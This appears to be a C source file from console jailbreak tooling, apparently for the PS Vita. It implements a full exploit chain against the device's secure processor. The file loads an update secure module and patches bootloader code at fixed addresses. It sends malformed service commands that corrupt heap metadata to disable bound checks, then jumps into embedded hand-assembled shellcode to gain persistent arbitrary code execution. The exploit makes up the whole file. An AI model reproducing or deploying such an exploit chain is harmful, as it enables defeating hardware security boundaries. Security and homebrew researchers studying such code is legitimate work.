#include "lv0.h"

#include "fmgr.h"
#include "utils.h"

#include "lv0p_data.h" // lv0 patcher payload

// dfl sm_auth_info
static const unsigned char lv0_ctx_130_data[0x90] =
{
  0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x28, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,
  0xc0, 0x00, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
  0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x09,
  0x80, 0x03, 0x00, 0x00, 0xc3, 0x00, 0x00, 0x00, 0x80, 0x09,
  0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00
};

// run code @ 0x1f850100 and jump back to 0xd0002::sw6
static const unsigned char NMPstage2_payload[] =
{
	0x21, 0xc0, 0x85, 0x1f,	// movh r0, 0x1f85
	0x04, 0xc0, 0x00, 0x01,	// or3 r0, r0, 0x100
	0x0f, 0x10,				// jsr r0
	0x21, 0xc0, 0x00, 0x00,	// movh r0, 0x0
	0x26, 0xd3, 0xbd, 0x80,	// movu r3, 0x80bd26	(0x80bd8c on .71)
	0x3e, 0x10				// jmp r3
};

// from psp2spl
static const unsigned char framework_nmp[] = {
  0xc0, 0x6f, 0x06, 0x45, 0x1a, 0x7b, 0x21, 0xc5, 0x85, 0x1f, 0xfa, 0x0b,
  0x5f, 0x02, 0x01, 0xc3, 0xff, 0x14, 0x35, 0xe2, 0x15, 0x00, 0x5b, 0xc2,
  0x03, 0x00, 0x34, 0x53, 0x35, 0xe2, 0x10, 0x00, 0x5e, 0xc0, 0x04, 0x00,
  0x5e, 0xc1, 0x08, 0x00, 0x69, 0x53, 0x58, 0xc3, 0x03, 0x00, 0x0f, 0x10,
  0x5a, 0xc0, 0x0c, 0x00, 0x07, 0x45, 0xfe, 0x0b, 0x40, 0x6f, 0xbe, 0x10,
  0x21, 0xc3, 0x00, 0xe0, 0x34, 0xc3, 0x10, 0x00, 0x3e, 0x01, 0xdc, 0xd3,
  0x0a, 0x80, 0x3f, 0x10, 0xe8, 0xbf, 0x00, 0x00, 0xf0, 0xff, 0x1f, 0x00
};

static int lv0_sm_loaded = 0;
int lv0_load_sm(const char *path) {
	ILOG("lv0_load_sm(path=%s)\n", path);
	if (lv0_sm_loaded) {
		ELOG("Error: SM already loaded!\n");
		return -1;
	}
	uint32_t sm_size = fmgr_get_file_size(path);
	if (!sm_size) {
		ELOG("Error: SM file size is 0!\n");
		return -1;
	}
    void *sm_buf = rmemblock_alloc((sm_size + 0xfff) & 0xfffff000, 0x10208006, 0);  // fmgr_get_file(path, NULL, 0, 0, &sm_size);
    if (!fmgr_get_file(path, sm_buf, sm_size, 0, NULL)) {
        ELOG("Failed to cache the SM from %s\n", path);
		return -1;
    }
    void *cmd_buf = rmemblock_alloc(0x1000, 0x10208006, 0);
    if (!cmd_buf) {
		ELOG("Failed to allocate command buffer for SM\n");
		my_free(sm_buf);
		return -1;
	}
    struct lv0_ctx130_s ctx130;
	memset(&ctx130, 0, sizeof(struct lv0_ctx130_s));
	memcpy(ctx130.data0, lv0_ctx_130_data, sizeof(lv0_ctx_130_data));
	ctx130.pathId = 2; // os0
	ctx130.self_type = (ctx130.self_type & 0xFFFFFFF0) | 2; // set self_type to user mode
    struct lv0_paddr_list_s paddr_list;
    memset(&paddr_list, 0, sizeof(struct lv0_paddr_list_s));
    struct lv0_pa_pair_s pairs[8];
    memset(&pairs, 0, sizeof(pairs));
	struct lv0_pa_pair_s vrange;
    memset(&vrange, 0, sizeof(struct lv0_pa_pair_s));
	vrange.addr = (uint32_t)sm_buf;
	vrange.length = sm_size;
	paddr_list.size = sizeof(paddr_list);
	paddr_list.list = &pairs[0];
	paddr_list.list_size = 8;
	DLOG("Get pAddr list for SM: addr=0x%08X, length=0x%08X\n", vrange.addr, vrange.length);
	int ret = nskbl_get_paddr_list(&vrange, &paddr_list);
	if (ret < 0 || paddr_list.ret_count == 0) {
		ELOG("Failed to get PAddr list for SM : 0x%08X\n", ret);
		goto lv0_lsm_end;
	}
	uint32_t paddr_pairs_paddr = 0;
	memcpy(cmd_buf, &pairs, paddr_list.ret_count * sizeof(struct lv0_pa_pair_s));
	DLOG("Get PAddr for command buffer: addr=0x%08X, length=0x%08X\n", (uint32_t)cmd_buf, sizeof(struct lv0_pa_pair_s) * paddr_list.ret_count);
	ret = nskbl_get_paddr_single(cmd_buf, &paddr_pairs_paddr);
	if (ret < 0 || !paddr_pairs_paddr) {
		ELOG("Failed to get PAddr for command buffer: 0x%08X\n", ret);
		goto lv0_lsm_end;
	}
	DLOG("Invoke SM with PAddr list: paddr=0x%08X, count=%d\n", paddr_pairs_paddr, paddr_list.ret_count);
	ret = nskbl_smtool_invoke(0, paddr_pairs_paddr, paddr_list.ret_count, NULL, &ctx130, (int *)NSKBL_SMTOOL_CTX);
	if (ret < 0) {
		ELOG("Failed to invoke SM for TZ: 0x%08X\n", ret);
		goto lv0_lsm_end;
	}
    v16p 0x51016cf2 = 0x2000; // remove the loadsm call from load_kprauthsm (since ussm is already loaded)
    v16p 0x51016cf4 = 0x2000; // ^
	nskbl_clean_dcache((void *)0x51016ce0, 0x20);
	nskbl_flush_icache();
	DLOG("Load SM to f00d..\n");
	ret = nskbl_smtool_load_ka();
    v16p 0x51016bec = 0xbf00;  // patch call_kprxauthsm_func to not modify 3rd arg
    nskbl_clean_dcache((void *)0x51016be0, 0x20);
    nskbl_flush_icache();
lv0_lsm_end:
    my_free(sm_buf);
    my_free(cmd_buf);
	return ret;
}

int lv0_stop_sm(void) {
    ILOG("lv0_stop_sm()\n");
	if (!lv0_sm_loaded) {
		ELOG("Error: SM not loaded!\n");
		return -1;
	}
	int ret = nskbl_smtool_stop();
	DLOG("nskbl_smtool_stop returned: 0x%08X\n", ret);
    v16p 0x51016cf2 = 0xf7ff;  // undo load_kprxauthsm patches
    v16p 0x51016cf4 = 0xf915;  // ^
    nskbl_clean_dcache((void *)0x51016ce0, 0x20);
    nskbl_flush_icache();
    v16p 0x51016bec = 0x6073;  // undo the 3rd arg patch
    nskbl_clean_dcache((void *)0x51016be0, 0x20);
    nskbl_flush_icache();
    lv0_sm_loaded = 0;
	return ret;
}

int lv0_call_sm(int svc, void *argv, uint32_t size) {
    ILOG("lv0_call_sm(svc=0x%X, argv=%08X, size=0x%X)\n", svc, argv, size);
	if (!lv0_sm_loaded) {
		ELOG("Error: SM not loaded!\n");
		return -1;
	}
	if (!argv || !size) {
		ELOG("Invalid arguments for SM call\n");
		return -1;
	}
    int ret = nskbl_smtool_call_big_ka(argv, size + 0x40, svc);
    DLOG("nskbl_smtool_call_big_ka returned: 0x%08X\n", ret);
	return ret;
}

static int lv0_ussm_corrupt(void *cmd_buf, uint32_t addr) {
    DLOG("lv0_ussm_corrupt(cmd_buf=%08X, addr=0x%08X)\n", cmd_buf, addr);
	struct lv0_corrupt_args_cmd_s *cormd = cmd_buf;
	memset(cmd_buf, 0, sizeof(struct lv0_corrupt_args_cmd_s));
	cormd->size = sizeof(struct lv0_cmd_0x50002_s) + 0x40;
	cormd->service_id = 0x50002;
	cormd->cargs.use_lv2_mode_0 = cormd->cargs.use_lv2_mode_1 = 0;
	cormd->cargs.list_count = 3;
	cormd->cargs.total_count = 1;
	cormd->cargs.list.lv1[0].addr = cormd->cargs.list.lv1[1].addr = 0x50000000;
	cormd->cargs.list.lv1[0].length = cormd->cargs.list.lv1[1].length = 0x10;
	cormd->cargs.list.lv1[2].addr = 0;
	cormd->cargs.list.lv1[2].length = addr - offsetof(struct lv0_heap_hdr_s, next);
    return lv0_call_sm(0x50002, cmd_buf, sizeof(struct lv0_cmd_0x50002_s));
}

static int lv0_ussm_install_spl(void) {
    ILOG("lv0_ussm_install_spl()\n");
    void *cmd_args = rmemblock_alloc(sizeof(struct lv0_corrupt_args_cmd_s), 0x10208006, 0);
    if (!cmd_args) {
		ELOG("Failed to allocate jump command buffer\n");
		return -1;
	}
    void *payload_buf = rmemblock_alloc(LV0_SPL_BLOCK_SIZE, 0x10208006, LV0_SPL_BLOCK_PA);
    if (!payload_buf) {
		ELOG("Failed to allocate payload buffer\n");
		my_free(cmd_args);
		return -1;
	}
    for (uint32_t addr = 0x0080bd10; addr < 0x0080bd24; addr += 4) {
        lv0_ussm_corrupt((void *)cmd_args, addr);  // patch ussm::0xd0002 to skip bound checks
    }
    uint8_t spr_backup[0x80];
    memcpy(spr_backup, payload_buf, sizeof(spr_backup));
    memset(payload_buf, 0, 0x600);
	struct lv0p_arg_s *arg = (struct lv0p_arg_s *)payload_buf;
	arg->magic = LV0P_ARG_MAGIC;
    arg->patcher = LV0_SPL_BLOCK_PA + LV0_SPL_INIT_PATCHER_OFF;
    arg->w_pa = LV0_SPL_BLOCK_PA + LV0_SPL_INIT_WORKBUF_OFF;
    memcpy(payload_buf + LV0_SPL_FMNFO_SZ, NMPstage2_payload, sizeof(NMPstage2_payload));
    memcpy(payload_buf + LV0_SPL_INIT_PATCHER_OFF, lv0p_nmp, lv0p_nmp_len);
    int *lv0rets[3];
	{
        uint32_t d_off = LV0_SPL_INIT_XENTRY_OFF;
        arg->d_pa = LV0_SPL_BLOCK_PA + d_off;
        struct lv0p_d_s *pd = (struct lv0p_d_s *)(payload_buf + d_off);
		d_off += sizeof(struct lv0p_d_s);
        memcpy(payload_buf + d_off, framework_nmp, sizeof(framework_nmp));
        pd->src = LV0_SPL_BLOCK_PA + d_off;
		pd->dst = LV0_SPL_INIT_FCMD_HANDLER_PA;
		pd->sz = LV0_SPL_INIT_FCMD_HANDLER_SZ;
        lv0rets[0] = &pd->ret;
        d_off += pd->sz;
        pd->next_pa = LV0_SPL_BLOCK_PA + d_off;
        pd = (struct lv0p_d_s *)(payload_buf + d_off);
		d_off += sizeof(struct lv0p_d_s);
		*(uint32_t *)(payload_buf + d_off) = LV0_SPL_INIT_U32_PATCH_DATA;
		pd->src = LV0_SPL_BLOCK_PA + d_off;
		pd->dst = LV0_SPL_INIT_U32_PATCH_ADDR;
		pd->sz = sizeof(uint32_t);
        lv0rets[1] = &pd->ret;
		d_off += pd->sz;
        pd->next_pa = LV0_SPL_BLOCK_PA + d_off;
		pd = (struct lv0p_d_s *)(payload_buf + d_off);
		d_off += sizeof(struct lv0p_d_s);
		*(uint16_t *)(payload_buf + d_off) = LV0_SPL_INIT_U16_PATCH_DATA;
		pd->src = LV0_SPL_BLOCK_PA + d_off;
		pd->dst = LV0_SPL_INIT_U16_PATCH_ADDR;
		pd->sz = sizeof(uint16_t);
        lv0rets[2] = &pd->ret;
		d_off += pd->sz;
    }
	struct lv0_jump_args_cmd_s *jumd = cmd_args;
	memset(jumd, 0, sizeof(struct lv0_jump_args_cmd_s));
	jumd->size = sizeof(struct lv0_jump_args_cmd_s) + 0x40;
	jumd->service_id = 0xd0002;
	jumd->req[0] = LV0_SPL_PAYLOAD_PA;  // paddr of stage2
    int ret = lv0_call_sm(0xd0002, cmd_args, sizeof(struct lv0_jump_args_cmd_s));  // call_kprxauthsm_func
    ILOG("lv0_call_sm ret=0x%08X,lv0rets=%08X %08X %08X\n", ret, *lv0rets[0], *lv0rets[1], *lv0rets[2]);
    memcpy(payload_buf, spr_backup, sizeof(spr_backup));
    my_free(payload_buf);
	my_free(cmd_args);
	return 0;
}

int lv0_initialized = 0;
int lv0_init(const char *ussm) {
    ILOG("lv0_init(ussm=%s)\n", ussm);
	if (lv0_initialized) {
		WLOG("lv0 is already initialized!\n");
		return 0;
	}
    int ret = lv0_load_sm(ussm);
    if (ret) {
        ELOG("Failed to load update SM: 0x%08X\n", ret);
		return ret;
    } else
		lv0_sm_loaded = 1;
    ret = lv0_ussm_install_spl();
	if (ret < 0)
		ELOG("Failed to install lv0 SPL: 0x%08X\n", ret);
	else {
		ILOG("lv0 SPL installed successfully\n");
		lv0_initialized = 1;
	}
	lv0_stop_sm();
	return ret;
}

int lv0_spl_exec(void *payload, uint32_t paddr, int size, uint32_t arg) {
    ILOG("lv0_spl_exec(payload=%08X, paddr=0x%08X, size=%d, arg=0x%08X)\n", payload, paddr, size, arg);
    if (!lv0_initialized) {
        ELOG("Error: lv0 not initialized!\n");
        return -1;
    }
	void *paddr_buf = NULL;
    void *payload_buf = NULL;
    if (size) { // alloc & memcpy
        payload_buf = rmemblock_alloc(LV0_SPL_BLOCK_SIZE, MEMBLOCK_TYPE_UCRW, LV0_SPL_BLOCK_PA);
        if (!payload_buf) {
            ELOG("Failed to allocate payload buffer\n");
            return -1;
        }
        if (!paddr)
            paddr = LV0_SPL_PAYLOAD_PA;  // use default paddr if not provided
        if (payload) {
            if ((paddr >= LV0_SPL_BLOCK_PA) && (paddr < (LV0_SPL_BLOCK_PA + LV0_SPL_BLOCK_SIZE))) {
                if (paddr < LV0_SPL_PAYLOAD_PA) {
                    ELOG("Invalid paddr for SPL payload: 0x%08X\n", paddr);
                    my_free(payload_buf);
                    return -1;
                } else
                    memcpy(payload_buf + LV0_SPL_FMNFO_SZ, payload, size);
            } else {
                paddr_buf = rmemblock_alloc(size, 0x10208006, paddr);
                if (!paddr_buf) {
                    ELOG("Failed to allocate payload buffer at paddr 0x%08X\n", paddr);
                    my_free(payload_buf);
                    return -1;
                }
                memcpy(paddr_buf, payload, size);
            }
        }
    } else // alReady
		payload_buf = payload;
    lv0_spl_fm_nfo *spl_nfo = (lv0_spl_fm_nfo *)payload_buf;
	memset(payload_buf, 0, sizeof(lv0_spl_fm_nfo));
    spl_nfo->codepaddr = paddr;
	spl_nfo->arg = arg;
	spl_nfo->resp = 0;  // response will be filled by the SPL
    spl_nfo->status = 0x34;
    spl_nfo->magic = 0x14ff;
    DLOG("Executing SPL payload at paddr=0x%08X, size=%d, arg=0x%08X\n", paddr, size, arg);
    nskbl_clean_dcache(payload_buf, LV0_SPL_FMNFO_SZ);
    nskbl_smc_custom(0, 0, 0, 0, 0x13c);
    nskbl_clean_dcache(payload_buf, LV0_SPL_FMNFO_SZ);
    ILOG("SPL execution completed with status: 0x%08X, response: 0x%08X\n", spl_nfo->status, spl_nfo->resp);
    int ret = (spl_nfo->status == 0x69) ? (int)spl_nfo->resp : -1;
    memset(payload_buf, 0, sizeof(lv0_spl_fm_nfo));
    if (size) {
		my_free(payload_buf);
		if (paddr_buf)
			my_free(paddr_buf);
	}
	return ret;
}

int lv0p_run(struct lv0p_arg_s *argv, uint32_t argp, uint32_t args, enum CHAIN_FREE_TYPES free) {
    if (!argv || argv->magic != LV0P_ARG_MAGIC) {
        ELOG("Invalid lv0p arg struct\n");
        return -1;
    }
    ILOG("lv0p_run(0x%08X->0x%08X, 0x%08X, 0x%08X)\n", argv, argv->patcher, argp, args);
    if (!argp) {
        argp = LV0_SPL_BLOCK_PA;
        args = LV0_SPL_BLOCK_SIZE;
        DLOG("Using default lv0p args: 0x%08X, 0x%08X\n", argp, args);
    }
    void *zbuf = rmemblock_alloc(args, MEMBLOCK_TYPE_UCRW, argp);
    if (!zbuf) {
        ELOG("Failed to allocate lv0p buf\n");
        return -1;
    }
    memset(zbuf, 0, args);
    uint32_t e_off = 0;
    if (argp == LV0_SPL_BLOCK_PA) {
        e_off = LV0_SPL_FMNFO_SZ;
        memcpy(zbuf + e_off, lv0p_nmp, lv0p_nmp_len);
        e_off += lv0p_nmp_len;
    }
	// Copy args
	uint32_t arg_argloc = argp + e_off;
    struct lv0p_arg_s *pargv = (struct lv0p_arg_s *)((uint8_t *)zbuf + e_off);
    pargv->magic = LV0P_ARG_MAGIC;
    pargv->patcher = LV0_SPL_PAYLOAD_PA;
    pargv->stack = argv->stack;
    e_off += sizeof(struct lv0p_arg_s);
    if (!argv->w_pa) {
        pargv->w_pa = argp + e_off;
        e_off += LV0P_WORKBUF_MIN_SIZE;
    } else
        pargv->w_pa = argv->w_pa;
    uint32_t tmpa = 0;
    struct lv0p_k_s *ok = argv->k;
    struct lv0p_k_s *ck = NULL;
    struct lv0p_k_s **pk = &pargv->k;
	DLOG("Copying lv0p_k_s structures\n");
    while (ok) {
        ck = (struct lv0p_k_s *)((uint8_t *)zbuf + e_off);
        *pk = (struct lv0p_k_s *)((uint32_t)argp + e_off);
        e_off += sizeof(struct lv0p_k_s);
        ck->id = ok->id;
        ck->off = ok->off;
        ck->sz = ok->sz;
        memcpy(ck->data, ok->data, ck->sz);
        ok = ok->next;
        pk = &ck->next;
    }
    struct lv0p_d_s *od = argv->d;
    struct lv0p_d_s *cd = NULL;
    struct lv0p_d_s **pd = &pargv->d;
	DLOG("Copying lv0p_d_s structures\n");
    while (od) {
        cd = (struct lv0p_d_s *)((uint8_t *)zbuf + e_off);
        *pd = (struct lv0p_d_s *)((uint32_t)argp + e_off);
        e_off += sizeof(struct lv0p_d_s);
        cd->dst = od->dst;
        cd->sz = od->sz;
        if (od->ncopyin)
            cd->src = od->src;
        else {
            cd->src = argp + e_off;
            memcpy(zbuf + e_off, od->src_va, od->sz);
            e_off += od->sz;
        }
        od = od->next;
        pd = &cd->next;
    }
    struct lv0p_x_s *ox = argv->x;
    struct lv0p_x_s *cx = NULL;
    struct lv0p_x_s **px = &pargv->x;
    DLOG("Copying lv0p_x_s structures\n");
    while (ox) {
        cx = (struct lv0p_x_s *)((uint8_t *)zbuf + e_off);
        *px = (struct lv0p_x_s *)((uint32_t)argp + e_off);
        e_off += sizeof(struct lv0p_x_s);
        cx->arg = ox->arg;
        if (ox->c_sz) {
            cx->addr = argp + e_off;
            memcpy(zbuf + e_off, ox->src_va, ox->c_sz);
            e_off += ox->c_sz;
        } else
            cx->addr = ox->addr;
        ox = ox->next;
        px = &cx->next;
    }
    nskbl_clean_dcache(zbuf, args);
    int ret = lv0_spl_exec((argp == LV0_SPL_BLOCK_PA) ? zbuf : lv0p_nmp, pargv->patcher, (argp == LV0_SPL_BLOCK_PA) ? 0 : lv0p_nmp_len, arg_argloc);
    nskbl_clean_dcache(zbuf, args);
    // Copy return values
    e_off = (arg_argloc - argp);
    pargv = (struct lv0p_arg_s *)((uint8_t *)zbuf + e_off);
    e_off += sizeof(struct lv0p_arg_s);
    if (!argv->w_pa)
        e_off += LV0P_WORKBUF_MIN_SIZE;
    ok = argv->k;
    ck = NULL;
    DLOG("Copying lv0p_k_s rets\n");
    while (ok) {
        ck = (struct lv0p_k_s *)((uint8_t *)zbuf + e_off);
        e_off += sizeof(struct lv0p_k_s);
        ok->ret = ck->ret;
        ck = ok;
        ok = ok->next;
        if (free & CHAIN_FREE_ENTRIES)
            my_free(ck);
    }
    od = argv->d;
    cd = NULL;
    DLOG("Copying lv0p_d_s rets\n");
    while (od) {
        cd = (struct lv0p_d_s *)((uint8_t *)zbuf + e_off);
        e_off += sizeof(struct lv0p_d_s);
        if (!od->ncopyin) {
            if (od->src_va && (free & CHAIN_FREE_NESTED))
                my_free(od->src_va);
            e_off += od->sz;
        }
        od->ret = cd->ret;
        cd = od;
        od = od->next;
        if (free & CHAIN_FREE_ENTRIES)
            my_free(cd);
    }
    ox = argv->x;
    cx = NULL;
    DLOG("Copying lv0p_x_s rets\n");
    while (ox) {
        cx = (struct lv0p_x_s *)((uint8_t *)zbuf + e_off);
        e_off += sizeof(struct lv0p_x_s);
        if (ox->c_sz && ox->src_va && (free & CHAIN_FREE_NESTED))
            my_free(ox->src_va);
        ox->ret = cx->ret;
        if (ox->c_sz)
            e_off += ox->c_sz;
        cx = ox;
        ox = ox->next;
        if (free & CHAIN_FREE_ENTRIES)
            my_free(cx);
    }
    my_free(zbuf);
    return ret;
}